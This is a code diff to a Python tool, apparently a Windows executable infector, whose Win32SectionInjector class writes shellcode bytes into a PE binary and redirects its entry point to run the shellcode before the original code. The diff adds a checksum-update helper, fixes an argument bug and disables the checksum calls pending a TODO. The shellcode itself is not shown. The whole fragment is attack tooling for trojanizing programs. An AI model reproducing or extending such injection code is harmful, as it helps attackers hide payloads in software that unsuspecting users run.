@@ -20,11 +20,16 @@ class Win32SectionInjector:
             self.binary_data[memory_offset] = shell_code_byte
             memory_offset += 1
 
+    def _update_checksum(self, header_offset):
+        checksum_offset = header_offset + Win32BinaryOffsetsAndSizes.OFFSET_TO_CHECKSUM
+        checksum = Win32BinaryUtils.compute_checksum(self.binary_data, header_offset)
+        MultiByteHandler.set_dword_given_offset(self.binary_data, checksum_offset, checksum)
+
     def modify_binary(self):
 
         header_offset = MultiByteHandler.get_dword_given_offset(self.binary_data, Win32BinaryOffsetsAndSizes.OFFSET_TO_PE_HEADER_OFFSET)
         # Get current RVA for entrypoint
-        offset_for_address_of_entrypoint_rva = MultiByteHandler.get_dword_given_offset(header_offset + Win32BinaryOffsetsAndSizes.OFFSET_TO_ENTRYPOINT_RVA)
+        offset_for_address_of_entrypoint_rva = MultiByteHandler.get_dword_given_offset(self.binary_data, header_offset + Win32BinaryOffsetsAndSizes.OFFSET_TO_ENTRYPOINT_RVA)
 
         #Get formated shellcode
         self.shell_code = self.shell_code_generator.get_base_shell_code(offset_for_address_of_entrypoint_rva - self.injection_location_rva)
@@ -34,8 +39,8 @@ class Win32SectionInjector:
         # Redirect execution to shellcode
         self._overwrite_entrypoint_rva(header_offset)
         # TODO: Enable Checksum
-        self._update_checksum(self.binary_data, header_offset)
-        Win32BinaryUtils.compute_checksum(self.binary_data, header_offset)
+        #self._update_checksum(header_offset)
+        #Win32BinaryUtils.compute_checksum(self.binary_data, header_offset)
 
         return self.binary_data
 
